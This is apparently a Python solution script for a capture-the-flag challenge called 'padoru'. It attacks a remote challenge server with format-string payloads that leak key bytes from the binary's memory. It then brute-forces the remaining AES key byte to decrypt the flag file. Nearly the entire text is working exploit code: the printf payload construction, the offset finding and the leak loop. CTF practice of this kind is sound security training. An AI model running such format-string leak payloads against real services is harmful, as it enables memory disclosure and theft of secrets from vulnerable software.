from pwnscripts import *
context.binary = 'padoru'
@context.quiet
def printf(s: bytes):
    r = remote('chals.whitehacks.ctf.sg', 20001)
    r.sendafter('=> ', s)
    r.recvuntil('wrapping:\n')
    rtr = r.recvline()
    r.close()
    return rtr

off = fsb.find_offset.buffer(printf)
i = 1
key = b''
while i < 0x20:
    #key = fsb.leak.dereference(printf, off, [context.binary.symbols['keydata']+1])
    payload = b'^^%11$s$$\x19\x19\x19\x19\x19\x19\x19AAAAAAAA'
    payload += p32(context.binary.symbols['keydata'] + i)[:3] + b'\n'
    leak = fsb.leak.deref_extractor(printf(payload))[0]
    key += leak
    i += len(leak)
    key += b'\0'
    i += 1
assert len(key) == 31

from Crypto.Cipher import AES
enc_flag = read('flag.wrapped')
for i in range(256):
    trying = bytes([i]) + key
    cipher = AES.new(trying, AES.MODE_ECB)
    if b'WH2021' in (s := cipher.decrypt(enc_flag)):
        print(s)
